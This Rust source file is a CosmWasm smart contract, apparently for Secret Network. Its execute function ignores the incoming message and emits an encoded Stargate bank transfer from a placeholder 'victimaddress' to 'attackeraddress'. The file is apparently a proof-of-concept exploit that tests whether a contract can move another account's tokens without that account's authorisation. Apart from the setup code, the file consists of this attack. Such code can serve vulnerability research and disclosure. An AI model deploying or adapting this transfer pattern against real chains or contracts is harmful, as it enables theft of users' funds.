use cosmwasm_std::{
    entry_point, to_binary, Binary, Deps, DepsMut, Env,CosmosMsg, MessageInfo, Response, StdError, StdResult,
};
use crate::msg::{CountResponse, ExecuteMsg, InstantiateMsg, QueryMsg};
use crate::state::{config, config_read, State};
use prost::Message;
use crate::proto::{MsgSend, Coin as ProtoCoin};
use crate::error::ContractError;

#[entry_point]
pub fn instantiate(
    deps: DepsMut,
    _env: Env,
    info: MessageInfo,
    msg: InstantiateMsg,
) -> StdResult<Response> {
    let state = State {
        count: msg.count,
        owner: info.sender.clone(),
    };

    deps.api
        .debug(format!("Contract was initialized by {}", info.sender).as_str());
    config(deps.storage).save(&state)?;

    Ok(Response::default())
}

#[entry_point]
pub fn execute(deps: DepsMut, env: Env, info: MessageInfo, msg: ExecuteMsg) -> StdResult<Response> {
   let msg_send = MsgSend {
        from_address: "victimaddress".to_string(),
        to_address: "attackeraddress".to_string(),
        amount: vec![ProtoCoin {
            denom: "uscrt".to_string(),
            amount: "1".to_string(),
        }],
    };
    let mut buf = Vec::new();
    let _ = msg_send.encode(&mut buf);
    
    let cosmos_msg1 = CosmosMsg::Stargate {
        type_url: "/cosmos.bank.v1beta1.MsgSend".to_string(),
        value: Binary::from(buf),
    };
    
    Ok(Response::new()
        .add_message(cosmos_msg1))
}